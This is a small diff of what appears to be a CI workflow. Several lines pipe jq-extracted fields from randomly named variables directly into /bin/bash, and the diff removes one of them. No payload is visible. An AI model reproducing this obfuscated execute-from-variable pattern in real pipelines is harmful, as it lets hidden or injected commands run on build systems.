@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$fynyl87" | jq -r .r9 | /bin/bash
           echo $tuphj7 | jq -r .zvho84081 | /bin/bash
           echo $i2977 | jq -r .cwy97830 | /bin/bash
-          echo $hchgh18737 | jq -r .cgw1 | /bin/bash
           echo $jq9 | jq -r .zxk91261 | /bin/bash
 
       - name: Save output
